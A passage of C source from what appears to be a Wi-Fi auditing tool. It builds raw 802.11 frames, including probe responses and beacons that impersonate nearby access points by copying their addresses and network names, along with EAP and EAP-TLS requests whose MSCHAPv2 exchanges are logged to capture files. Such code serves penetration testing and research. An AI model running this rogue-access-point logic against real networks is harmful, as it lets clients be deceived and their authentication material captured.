#define PROBERESPONSE_IE_WPAPSK_SIZE sizeof(proberesponse_ie_wpapsk)

const uint8_t proberesponse_ie_wpaentpsk[] =
{
/* Tag: RSN Information WPA2 PSK */
0x30, 0x18, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x02, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element WPA1 AES */
0xdd, 0x1a, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x02, 0x00,
0x00, 0x50, 0xf2, 0x01,
0x00, 0x50, 0xf2, 0x02
};
#define PROBERESPONSE_IE_WPAENTPSK_SIZE sizeof(proberesponse_ie_wpaentpsk)

const uint8_t proberesponse_ie_wpaent[] =
{
/* Tag: RSN Information WPA2 ENT */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x01,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element WPA1 AES*/
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x01
};
#define PROBERESPONSE_IE_WPAENT_SIZE sizeof(proberesponse_ie_wpaent)

const uint8_t proberesponse_ie_extcap[] =
{
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define PROBERESPONSE_IE_EXTCAP_SIZE sizeof(proberesponse_ie_extcap)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +ESSID_LEN_MAX +IETAG_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macftx->addr1, client, 6);
memcpy(macftx->addr2, zeigerap->ap, 6);
memcpy(macftx->addr3, zeigerap->ap, 6);
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = zeigerap->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], zeigerap->essid, zeigerap->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerap->essidlen], &proberesponse_head_data, PROBERESPONSE_HEAD_SIZE);
if(((zeigerap->akm & TAK_PMKSA) == TAK_PMKSA) || ((zeigerap->akm & TAK_PMKSA256) == TAK_PMKSA256))
	{
	rsnwpa_size = PROBERESPONSE_IE_WPAENT_SIZE;
	memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerap->essidlen +PROBERESPONSE_HEAD_SIZE], &proberesponse_ie_wpaent, PROBERESPONSE_IE_WPAENT_SIZE);
	}
else
	if(wpaentflag == true)
		{
		rsnwpa_size = PROBERESPONSE_IE_WPAENTPSK_SIZE;
		memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerap->essidlen +PROBERESPONSE_HEAD_SIZE], &proberesponse_ie_wpaentpsk, PROBERESPONSE_IE_WPAENTPSK_SIZE);
		}
	else
		{
		rsnwpa_size = PROBERESPONSE_IE_WPAPSK_SIZE;
		memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerap->essidlen +PROBERESPONSE_HEAD_SIZE], &proberesponse_ie_wpapsk, PROBERESPONSE_IE_WPAPSK_SIZE);
		}
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerap->essidlen +PROBERESPONSE_HEAD_SIZE +rsnwpa_size], &proberesponse_ie_extcap, PROBERESPONSE_IE_EXTCAP_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerap->essidlen +0x0c] = ptrfscanlist->channel;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerap->essidlen +PROBERESPONSE_HEAD_SIZE +rsnwpa_size +PROBERESPONSE_IE_EXTCAP_SIZE, "failed to transmit proberesponse");
return;
}
/*===========================================================================*/
static inline void send_proberequest_directed(uint8_t *macap, int essid_len, uint8_t *essid)
{
static mac_t *macftx;

static const uint8_t directedproberequestdata[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
};
#define DIRECTEDPROBEREQUEST_SIZE sizeof(directedproberequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ESSID_LEN_MAX +DIRECTEDPROBEREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, macap, 6);
memcpy(macftx->addr2, &mac_myprclient, 6);
memcpy(macftx->addr3, macap, 6);
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +1] = essid_len;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE], essid, essid_len);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE +essid_len], &directedproberequestdata, DIRECTEDPROBEREQUEST_SIZE);
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +IETAG_SIZE +essid_len +DIRECTEDPROBEREQUEST_SIZE, "failed to transmit directed proberequest");
return;
}
/*===========================================================================*/
static inline void send_proberequest_undirected_broadcast()
{
static mac_t *macftx;

static const uint8_t undirectedproberequestdata[] =
{
0x00, 0x00,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
};
#define UNDIRECTEDPROBEREQUEST_SIZE sizeof(undirectedproberequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ESSID_LEN_MAX +UNDIRECTEDPROBEREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_myprclient, 6);
memcpy(macftx->addr3, &mac_broadcast, 6);
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &undirectedproberequestdata, UNDIRECTEDPROBEREQUEST_SIZE);
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE, "failed to transmit undirected proberequest");
return;
}
/*===========================================================================*/
static inline void send_beacon_active()
{
static mac_t *macftx;
static capap_t *capap;

if(rgbeaconptr >= rglist +RGLIST_MAX) rgbeaconptr = rglist;
if(rgbeaconptr->timestamp == 0) rgbeaconptr = rglist;
packetoutptr = epbown +EPB_SIZE;
if(((rgbeaconptr->akm & TAK_PMKSA) == TAK_PMKSA) || ((rgbeaconptr->akm & TAK_PMKSA256) == TAK_PMKSA256)) memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +reactivebeaconwpaentdatalen +1);
else memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +reactivebeacondatalen +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, rgbeaconptr->ap, 6);
memcpy(macftx->addr3, rgbeaconptr->ap, 6);
macftx->sequence = myreactivebeaconsequence++ << 4;
if(myreactivebeaconsequence >= 4096) myreactivebeaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = rgbeaconptr->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], rgbeaconptr->essid, rgbeaconptr->essidlen);
if(((rgbeaconptr->akm & TAK_PMKSA) == TAK_PMKSA) || ((rgbeaconptr->akm & TAK_PMKSA256) == TAK_PMKSA256))
	{
	memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconptr->essidlen], &reactivebeaconwpaentdata, reactivebeaconwpaentdatalen);
	packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconptr->essidlen +reactivebeaconwpaentdatachanoffset] = ptrfscanlist->channel;
	send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconptr->essidlen +reactivebeaconwpaentdatalen, "failed to transmit internal beacon");
	}
else
	{
	memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconptr->essidlen], &reactivebeacondata, reactivebeacondatalen);
	packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconptr->essidlen +reactivebeacondatachanoffset] = ptrfscanlist->channel;
	send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconptr->essidlen +reactivebeacondatalen, "failed to transmit internal beacon");
	}
rgbeaconptr++;
return;
}
/*===========================================================================*/
static inline void send_beacon_list_active()
{
static mac_t *macftx;
static capap_t *capap;

if(rgbeaconlistptr >= rgbeaconlist +RGLIST_MAX) rgbeaconlistptr = rgbeaconlist;
if(rgbeaconlistptr->timestamp == 0) rgbeaconlistptr = rgbeaconlist;
packetoutptr = epbown +EPB_SIZE;
if(((rgbeaconlistptr->akm & TAK_PMKSA) == TAK_PMKSA) || ((rgbeaconlistptr->akm & TAK_PMKSA256) == TAK_PMKSA256))
	memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +reactivebeaconwpaentdatalen +1);
else
	memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +reactivebeacondatalen +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, rgbeaconlistptr->ap, 6);
memcpy(macftx->addr3, rgbeaconlistptr->ap, 6);
macftx->sequence = myreactivebeaconsequence++ << 4;
if(myreactivebeaconsequence >= 4096) myreactivebeaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = rgbeaconlistptr->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], rgbeaconlistptr->essid, rgbeaconlistptr->essidlen);
if(((rgbeaconlistptr->akm & TAK_PMKSA) == TAK_PMKSA) || ((rgbeaconlistptr->akm & TAK_PMKSA256) == TAK_PMKSA256))
	{
	memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconlistptr->essidlen], &reactivebeaconwpaentdata, reactivebeaconwpaentdatalen);
	packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconlistptr->essidlen +reactivebeaconwpaentdatachanoffset] = ptrfscanlist->channel;
	send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconlistptr->essidlen +reactivebeaconwpaentdatalen, "failed to transmit internal beacon");
	}
else
	{
	memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconlistptr->essidlen], &reactivebeacondata, reactivebeacondatalen);
	packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconlistptr->essidlen +reactivebeacondatachanoffset] = ptrfscanlist->channel;
	send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +rgbeaconlistptr->essidlen +reactivebeacondatalen, "failed to transmit internal beacon");
	}
rgbeaconlistptr++;
return;
}
/*===========================================================================*/
static void send_beacon_hidden()
{
static mac_t *macftx;
static capap_t *capap;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +bcbeacondatahiddenlen +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_myaphidden, 6);
memcpy(macftx->addr3, &mac_myaphidden, 6);
macftx->sequence = myreactivebeaconsequence++ << 4;
if(myreactivebeaconsequence >= 4096) myreactivebeaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x411;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], &bcbeacondatahidden, bcbeacondatahiddenlen);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +bcbeacondatahiddenchanoffset] = ptrfscanlist->channel;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +bcbeacondatahiddenlen, "failed to transmit internal beacon");
return;
}
/*===========================================================================*/
static void send_beacon_open()
{
static mac_t *macftx;
static capap_t *capap;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +bcbeacondataopenlen +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &mac_myapopen, 6);
memcpy(macftx->addr3, &mac_myapopen, 6);
macftx->sequence = myreactivebeaconsequence++ << 4;
if(myreactivebeaconsequence >= 4096) myreactivebeaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x401;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], &bcbeacondataopen, bcbeacondataopenlen);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +bcbeacondataopenchanoffset] = ptrfscanlist->channel;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +bcbeacondataopenlen, "failed to transmit internal beacon");
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211exteap_mka()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void process80211exteap_asf()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void send_eap(uint8_t eapoltype, uint8_t code, uint8_t id, uint8_t eaptype, uint8_t *data, size_t data_len)
{
static mac_t *macftx;
static eapauth_t *eapauth;
static exteap_t *exteap;
static size_t eapdata_len;

static uint8_t eapdata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x01, 0x00, 0x00, 0x05, 0x01, 0x63, 0x00, 0x05, 0x01
};
#define EAP_DATA_SIZE sizeof(eapdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_QOS +LLC_SIZE +EAPAUTH_SIZE +data_len +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_QOS_DATA;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->from_ds = 1;
macftx->duration = 0x002c;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_QOS], &eapdata, EAP_DATA_SIZE);
eapauth = (eapauth_t*)&packetoutptr[HDRRT_SIZE +MAC_SIZE_QOS +LLC_SIZE];
exteap = (exteap_t*)&packetoutptr[HDRRT_SIZE +MAC_SIZE_QOS +LLC_SIZE +EAPAUTH_SIZE];
eapauth->type = eapoltype;
eapdata_len = 0;
if(eapoltype == EAPOL_START || eapoltype == EAPOL_LOGOFF)
	{
	eapdata_len = (LLC_SIZE +EAPAUTH_SIZE);
	eapauth->len = 0;
	}
else
	{
	switch(code)
		{
		case EAP_CODE_REQ:
		case EAP_CODE_RESP:
			eapdata_len = (LLC_SIZE +EAPAUTH_SIZE +EXTEAP_SIZE);
			eapauth->len = htons(EXTEAP_SIZE +data_len);
			break;
		case EAP_CODE_INITIATE:
		case EAP_CODE_FINISH:
			if(data_len == 0)
				{
				eapdata_len = (LLC_SIZE +EAPAUTH_SIZE +EXTEAP_SIZE -1);
				eapauth->len = htons(EXTEAP_SIZE -1);
				}
			else
				{
				eapdata_len = (LLC_SIZE +EAPAUTH_SIZE +EXTEAP_SIZE);
				eapauth->len = htons(EXTEAP_SIZE +data_len);
				}
			break;
		case EAP_CODE_SUCCESS:
		case EAP_CODE_FAILURE:
			eapdata_len = (LLC_SIZE +EAPAUTH_SIZE +EXTEAP_SIZE -1);
			eapauth->len = htons(EXTEAP_SIZE -1);
			break;
		};
	exteap->len = eapauth->len;
	exteap->code = code;
	exteap->id = id;
	exteap->type = eaptype;
	}
if(data_len > 0) memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_QOS +eapdata_len], data, data_len);
packetlenown = HDRRT_SIZE +MAC_SIZE_QOS +eapdata_len +data_len;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_QOS +eapdata_len +data_len, "failed to transmit EAP packet");
gettimeofday(&tvpacketsent, NULL);
memcpy(packetsent, packetoutptr, packetlenown);
packetsentlen = packetlenown;
packetsenttries = PACKET_RESEND_COUNT_MAX;
packetsentflag = true;
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void resend_packet()
{
static int fdnum;
static fd_set txfds;
static struct timespec tsfdtx;
static mac_t *macftx;

static char timestring[16];

FD_ZERO(&txfds);
FD_SET(fd_socket, &txfds);
if(packetsenttries == 0)
	{
	packetsentflag = false;
	return;
	}
macftx = (mac_t*)(&packetsent[HDRRT_SIZE]);
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
macftx->retry = 1;
tsfdtx.tv_sec = FDSECTXTIMER;
tsfdtx.tv_nsec = 0;
fdnum = pselect(fd_socket +1, NULL, &txfds, NULL, &tsfdtx, NULL);
if(fdnum < 0)
	{
	errorcount++;
	return;
	}
if(FD_ISSET(fd_socket, &txfds))
	{
	if(packetsentlen != write(fd_socket, &packetsent, packetsentlen))
		{
		strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
		fprintf(stdout, "%s %d/%d socket write error: failed to retransmit EAP packet\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel);
		errorcount++;
		return;
		}
	outgoingcount++;
	gettimeofday(&tvpacketsent, NULL);
	packetsenttries--;
	if(packetsenttries == 0) packetsentflag = false;
	return;
	}
strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
fprintf(stdout, "%s %d/%d driver is busy/broken: failed to retransmit EAP packet\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel);
return;
}
/*===========================================================================*/
static inline void send_eap_request(uint8_t id, uint8_t eaptype, uint8_t *requestdata, size_t requestdata_len)
{
send_eap(EAP_PACKET, EAP_CODE_REQ, id, eaptype, requestdata, requestdata_len);
return;
}
/*===========================================================================*/
static inline void send_eap_status_resp(uint8_t code, uint8_t id, uint8_t eaptype)
{
send_eap(EAP_PACKET, code, id, eaptype, NULL, 0);
return;
}
/*===========================================================================*/
static inline void send_eap_request_id(eapctx_t *eapctx)
{
if(eapctx == NULL) send_eap_request(0, EAP_TYPE_ID, NULL, 0);
else
	{
	eapctx->id++;
	send_eap_request(eapctx->id, EAP_TYPE_ID, NULL, 0);
	}
return;
}
/*===========================================================================*/
static inline void send_eap_tls(eapctx_t *eapctx, uint8_t *data, size_t datalen)
{
static int res;
static int outlen;
static uint32_t outlen_n;
uint8_t tlsflags = eapctx->version;

#ifdef DEBUG_TLS
snprintf(debugmsg, DEBUGMSG_MAX, "TLS connection write len=%d, id=%d:", (int)datalen, eapctx->id +1);
debugprint((int)datalen, data, debugmsg);
#endif
res = SSL_write(eaptlsctx->ssl, data, datalen);
outlen = BIO_pending(eaptlsctx->tls_out);
#ifdef DEBUG_TLS
snprintf(debugmsg, DEBUGMSG_MAX, "TLS BIO out len=%d", outlen);
debugprint(0, NULL, debugmsg);
#endif
if(outlen > (int)(EAP_LEN_MAX -EXTEAP_SIZE -EAP_TLSFLAGS_SIZE))
	{
	tlsflags |= (EAP_TLSFLAGS_MORE_FRAGMENTS | EAP_TLSFLAGS_LENGTH_INCL);
	eaptlsctx->fragments_tx = true;
	eaptlsctx->tlslen = outlen;
	eaptlsctx->buflen = EAP_LEN_MAX -EXTEAP_SIZE -EAP_TLSFLAGS_SIZE -EAP_TLSLENGTH_SIZE;
	outlen_n = htonl(outlen);
	memcpy(&eaptlsctx->buf[EAP_TLSFLAGS_SIZE], &outlen_n, EAP_TLSLENGTH_SIZE);
	res = BIO_read(eaptlsctx->tls_out, (void*)&eaptlsctx->buf[EAP_TLSFLAGS_SIZE +EAP_TLSLENGTH_SIZE], EAPTLSCTX_BUF_SIZE);
	res = eaptlsctx->buflen +EAP_TLSLENGTH_SIZE;
	eaptlsctx->txpos = res +EAP_TLSFLAGS_SIZE;
#ifdef DEBUG_TLS
	snprintf(debugmsg, DEBUGMSG_MAX, "TLS out sending 1.fragment len=%d", res);
	debugprint(0, NULL, debugmsg);
#endif
	}
else
	{
	eaptlsctx->fragments_tx = false;
	res = BIO_read(eaptlsctx->tls_out, (void*)&eaptlsctx->buf[EAP_TLSFLAGS_SIZE], EAPTLSCTX_BUF_SIZE);
	if(res < 0) res = 0;
	}
eaptlsctx->buf[0] = tlsflags;
eapctx->id++;
send_eap_request(eapctx->id, eapctx->type, &eaptlsctx->buf[0], res +EAP_TLSFLAGS_SIZE);
return;
}
/*===========================================================================*/
static inline void send_eap_tls_eap(eapctx_t *eapctx, uint8_t code, uint8_t id, uint8_t eaptype, uint8_t *data, size_t data_len)
{
static uint8_t outbuf[EXTEAP_SIZE +EAP_LEN_MAX];
static exteap_t *exteap;
static size_t exteaplen = 0;

exteap = (exteap_t*)&outbuf[0];
exteap->code = code;
exteap->id = id;
exteap->type = eaptype;
switch(code)
	{
	default:
	case EAP_CODE_REQ:
	case EAP_CODE_RESP:
		exteaplen = EXTEAP_SIZE;
		break;
	case EAP_CODE_INITIATE:
	case EAP_CODE_FINISH:
		if(data_len == 0)
			{
			exteaplen = (EXTEAP_SIZE -1);
			}
		else
			{
			exteaplen = EXTEAP_SIZE;
			}
		break;
	case EAP_CODE_SUCCESS:
	case EAP_CODE_FAILURE:
		exteaplen = (EXTEAP_SIZE -1);
		break;
	}
exteaplen += data_len;
exteap->len = htons(exteaplen);
memcpy(exteap->data, data, data_len);
send_eap_tls(eapctx, outbuf, exteaplen);
if(fd_pcapng > 0)
	switch(eaptype)
		{
		case EAP_TYPE_MSCHAPV2:
		case EAP_TYPE_MSEAP:
			writeepbown_peap(fd_pcapng, outbuf, exteaplen);
		}
}
/*===========================================================================*/
static inline void send_eap_tls_eap_request(eapctx_t *eapctx, uint8_t id, uint8_t eaptype, uint8_t *data, size_t data_len)
{
send_eap_tls_eap(eapctx, EAP_CODE_REQ, id, eaptype, data, data_len);
}
/*===========================================================================*/
/*===========================================================================*/
static inline void printown(ownlist_t *zeiger, char *msg)
{
static int c, p;
static macessidlist_t *zeigerap;
static char timestring[16];
static char essidstring[ESSID_LEN_MAX *2 +1];

p = 0;
for(c = 0; c < zeiger->essidlen; c++)
	{
	if((zeiger->essid[c] < 0x20) || (zeiger->essid[c] > 0x7e)) essidstring[p++] = '.';
	else if(zeiger->essid[c] == 0x5c)
		{
		essidstring[p++] = 0x5c;
		essidstring[p++] = 0x5c;
		}
	else essidstring[p++] = zeiger->essid[c];
	}
essidstring[p] = 0;
if(essidstring[0] == 0)
	{
	for(zeigerap = aplist; zeigerap < aplist +APLIST_MAX; zeigerap++)
		{
		if(memcmp(zeigerap->ap, zeiger->ap, 6) == 0)
			{
			p = 0;
			for(c = 0; c < zeigerap->essidlen; c++)
				{
				if((zeigerap->essid[c] < 0x20) || (zeigerap->essid[c] > 0x7e)) essidstring[p++] = '.';
				else if(zeigerap->essid[c] == 0x5c)
					{
					essidstring[p++] = 0x5c;
					essidstring[p++] = 0x5c;
					}
				else essidstring[p++] = zeigerap->essid[c];
				}
			essidstring[p] = 0;
			break;
			}
		}
	}
if(essidstring[0] == 0)
	{
	for(zeigerap = rglist; zeigerap < rglist +RGLIST_MAX; zeigerap++)
		{
		if(memcmp(zeigerap->ap, zeiger->ap, 6) == 0)
			{
			p = 0;
			for(c = 0; c < zeigerap->essidlen; c++)
				{
				if((zeigerap->essid[c] < 0x20) || (zeigerap->essid[c] > 0x7e)) essidstring[p++] = '.';
				else if(zeigerap->essid[c] == 0x5c)
					{
					essidstring[p++] = 0x5c;
					essidstring[p++] = 0x5c;
					}
				else essidstring[p++] = zeigerap->essid[c];
				}
			essidstring[p] = 0;
			break;
			}
		}
	}
